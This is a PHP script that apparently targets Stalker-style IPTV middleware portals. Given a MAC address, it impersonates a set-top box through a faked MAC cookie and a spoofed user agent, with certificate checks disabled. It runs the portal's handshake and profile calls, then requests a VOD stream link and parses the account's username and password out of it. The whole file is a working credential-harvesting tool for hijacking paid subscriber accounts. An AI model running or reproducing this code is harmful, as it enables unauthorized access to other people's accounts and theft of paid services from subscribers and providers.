<?php

// CURL http get request
function curl_http_get ($url, $headers = []) {
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko');
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  $output = curl_exec($ch);
  curl_close($ch);
  return json_decode($output, true);
}

// Get Username and Password for mac-address
function getUserPassForMac($mac, $base_url) {
  // URL Encode MAC for processing
  $mac_address = urlencode($mac);
  // URL's
  $token_url    = '/portal.php?action=handshake&type=stb&token=';
  $profile_url  = '/portal.php?type=stb&action=get_profile';
  $list_url			= '/portal.php?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml';
  // Get token from server
  $first_token  = curl_http_get($base_url . $token_url)['js']['token'];
  // Set token in header and request new token
  $second_token = curl_http_get($base_url . $token_url, [
    "Authorization: Bearer $first_token",
    "Cookie: mac={$mac_address}; stb_lang=en; timezone=Europe%2FAmsterdam"
  ])['js']['token'];
  // Set token in header and get profile
  $profile = curl_http_get($base_url . $profile_url, [
    "Authorization: Bearer {$second_token}",
    "Cookie: mac={$mac_address}; stb_lang=en; timezone=Europe%2FAmsterdam"
  ]);
  // Login failed - wrong mac address..
  if (empty($profile['js']['id'])) {
  	return false;
  }
  // Get list with needed command
  $list = curl_http_get($base_url . $list_url, [
    "Authorization: Bearer {$second_token}",
    "Cookie: mac={$mac_address}; stb_lang=en; timezone=Europe%2FAmsterdam"
  ]);
  // Get url for command -> grab user:pass from this url..
  $cmd = $list['js']['data'][0]['cmd'];
  $command_url = "/portal.php?action=create_link&type=vod&cmd={$cmd}a&JsHttpRequest=1-xml";
  $result = curl_http_get($base_url . $command_url, [
    "Authorization: Bearer {$second_token}",
    "Cookie: mac={$mac_address}; stb_lang=en; timezone=Europe%2FAmsterdam"
  ]);
  // Result array
  $res = explode('/', $result['js']['cmd']);
  if (count($res) < 6) {
  	return false;
  }
  return [
  	'username' => $res[4],
  	'password' => $res[5]
  ];
}